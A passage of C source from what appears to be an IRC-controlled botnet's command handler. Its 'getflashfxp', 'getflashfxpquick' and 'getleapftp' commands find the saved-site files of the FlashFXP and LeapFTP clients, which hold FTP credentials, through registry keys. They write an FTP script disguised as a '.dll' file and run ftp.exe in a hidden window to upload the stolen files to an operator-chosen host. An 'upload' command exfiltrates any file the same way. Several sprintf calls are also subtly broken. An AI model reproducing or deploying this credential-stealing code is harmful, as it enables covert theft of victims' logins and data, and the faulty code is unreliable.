				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_HTTP
			else if (strcmp("httpcon",a[s]) == 0 || strcmp("hcon",a[s]) == 0) { 
				HTTP_connect(sock,a[2],notice,silent,a[s+1],atoi(a[s+2]),a[s+3],a[s+4],a[s+5]);

				return repeat;
			}
			#endif


			else if (strcmp("getflashfxp", a[s]) == 0)
			{
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\Applications\\FlashFXP.exe\\shell\\open\\command", 0, KEY_READ, &hkey);
				DWORD dwSize = MAX_PATH;
				unsigned char szDataBuf[MAX_PATH];
				if(RegQueryValueEx(hkey, NULL, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{
					char sites[MAX_PATH];
					strcpy(sites,replacestr((char *)szDataBuf,"FlashFXP.exe %1","sites.dat"));
					if (FileExists(sites))
					{
						FILE *f = fopen((char *)&szDataBuf, "rb");
						//if (!f) goto FileDoesNotExist;

						fseek(f, 0, SEEK_END);
						int length = ftell(f);
						fseek(f, 0, SEEK_SET); // back to start

						if (length != 3341)
						{
							//sprintf(sendbuf, "[FlashFXP]: Found Sites: %s (%u bytes)\r\n", sites, length);
							//irc_privmsg(sock, a[2], sendbuf, notice);

							char tmpftp[MAX_PATH];

							srand(GetTickCount());
							sprintf(tmpftp,"TFTP%i%i.dll",rand()%999,rand()%99); 

							FILE * fp = fopen(tmpftp,"ab");
							if (fp != NULL) {
								fprintf(fp,
								"open %s %s\r\n"
								"%s\r\n"
								"%s\r\n"
								"put %s %s.sites.dat\r\n"
								"bye\r\n",a[s+1],a[s+2],a[s+3],a[s+4],sites,nick);
								fclose(fp);

								char cmdline[256]; 
								sprintf(cmdline,"-s:%s",tmpftp);
								if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE)) {
									sprintf(sendbuf, "[FlashFXP]: Uploading Sites: %s to %s (%u bytes)\r\n", sites, a[s+1], length);
									irc_privmsg(sock, a[2], sendbuf, notice);
									fclose(f);
								}
								else {
									sprintf("[FTP]: Uploading failed.",sites,a[s+1]);
									irc_privmsg(sock,a[2],sendbuf,notice); 
								}
								//remove(tmpftp); 
							}
						}
					}
				}
				//FileDoesNotExist:
				RegCloseKey(hkey);
			}



			else if (strcmp("getflashfxpquick", a[s]) == 0)
			{
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\Applications\\FlashFXP.exe\\shell\\open\\command", 0, KEY_READ, &hkey);
				DWORD dwSize = MAX_PATH;
				unsigned char szDataBuf[MAX_PATH];
				if(RegQueryValueEx(hkey, NULL, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{
					char sites[MAX_PATH];
					strcpy(sites,replacestr((char *)szDataBuf,"FlashFXP.exe %1","quick.dat"));
					if (FileExists(sites))
					{
						FILE *f = fopen((char *)&szDataBuf, "rb");
						//if (!f) goto FileDoesNotExist;

						fseek(f, 0, SEEK_END);
						int length = ftell(f);
						fseek(f, 0, SEEK_SET); // back to start

						if (length != 0)
						{
							//sprintf(sendbuf, "[FlashFXP]: Found Sites: %s (%u bytes)\r\n", sites, length);
							//irc_privmsg(sock, a[2], sendbuf, notice);

							char tmpftp[MAX_PATH];

							srand(GetTickCount());
							sprintf(tmpftp,"TFTP%i%i.dll",rand()%999,rand()%99); 

							FILE * fp = fopen(tmpftp,"ab");
							if (fp != NULL) {
								fprintf(fp,
								"open %s %s\r\n"
								"%s\r\n"
								"%s\r\n"
								"put %s %s.sites.dat\r\n"
								"bye\r\n",a[s+1],a[s+2],a[s+3],a[s+4],sites,nick);
								fclose(fp);

								char cmdline[256]; 
								sprintf(cmdline,"-s:%s",tmpftp);
								if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE)) {
									sprintf(sendbuf, "[FlashFXP]: Uploading Quick Sites: %s to %s (%u bytes)\r\n", sites, a[s+1], length);
									irc_privmsg(sock, a[2], sendbuf, notice);
									fclose(f);
								}
								else {
									sprintf("[FTP]: Uploading failed.",sites,a[s+1]);
									irc_privmsg(sock,a[2],sendbuf,notice); 
								}
								//remove(tmpftp); 
							}
						}
					}
				}
				//FileDoesNotExist:
				RegCloseKey(hkey);
			}

			else if (strcmp("getleapftp", a[s]) == 0)
			{
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\LeapFTP.exe", 0, KEY_READ, &hkey);
				DWORD dwSize = MAX_PATH;
				unsigned char szDataBuf[MAX_PATH];
				if(RegQueryValueEx(hkey, NULL, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{
					char sites[MAX_PATH];
					strcpy(sites,replacestr((char *)szDataBuf,"LeapFTP.exe","sites.ini"));
					if (FileExists(sites))
					{
						FILE *f = fopen((char *)&szDataBuf, "rb");
						//if (!f) goto FileDoesNotExist;

						fseek(f, 0, SEEK_END);
						int length = ftell(f);
						fseek(f, 0, SEEK_SET); // back to start

						if (length != 1219)
						{
							//sprintf(sendbuf, "[FlashFXP]: Found Sites: %s (%u bytes)\r\n", sites, length);
							//irc_privmsg(sock, a[2], sendbuf, notice);

							char tmpftp[MAX_PATH];

							srand(GetTickCount());
							sprintf(tmpftp,"TFTP%i%i.dll",rand()%999,rand()%99); 

							FILE * fp = fopen(tmpftp,"ab");
							if (fp != NULL) {
								fprintf(fp,
								"open %s %s\r\n"
								"%s\r\n"
								"%s\r\n"
								"put %s %s.sites.dat\r\n"
								"bye\r\n",a[s+1],a[s+2],a[s+3],a[s+4],sites,nick);
								fclose(fp);

								char cmdline[256]; 
								sprintf(cmdline,"-s:%s",tmpftp);
								if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE)) {
									sprintf(sendbuf, "[LeapFTP]: Uploading Sites: %s to %s (%u bytes)\r\n", sites, a[s+1], length);
									irc_privmsg(sock, a[2], sendbuf, notice);
									fclose(f);
								}
								else {
									sprintf("[FTP]: Uploading failed.",sites,a[s+1]);
									irc_privmsg(sock,a[2],sendbuf,notice); 
								}
								//remove(tmpftp); 
							}
						}
					}
				}
				//FileDoesNotExist:
				RegCloseKey(hkey);
			}
			// commands requiring at least 5 parameters 
		    else if (a[s+5] == NULL) return 1; 
			else if (strcmp("upload",a[s]) == 0) { 
				if (!FileExists(a[s+5])) { 
					sprintf(sendbuf,"[FTP]: File not found.");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
					return 1; 
				} 
				char tmpftp[MAX_PATH],tmpsys[MAX_PATH]; 

				srand(GetTickCount());
				sprintf(tmpftp,"%s\\%i%i%i.dll",tmpsys,rand()%999,rand()%99,rand()%9); 

				FILE * fp = fopen(tmpftp,"ab"); 
				if (fp != NULL) { 
					fprintf(fp, "open %s\r\n%s\r\n%s\r\n%s\r\nput %s\r\nbye\r\n",
						a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]); 
					fclose(fp); 

					char cmdline[256]; 
					sprintf(cmdline,"-s:%s",tmpftp); 
					if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE))
						sprintf("[FTP]: Uploading File: %s To: %s",a[s+5],a[s+1]);
					else
						sprintf("[FTP]: Uploading failed.",a[s+5],a[s+1]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice); 
					addlog(sendbuf);
		
					while (FileExists(tmpftp)) 
						remove(tmpftp); 
				}
				return repeat;
			}
		}
	}
	return repeat;
}
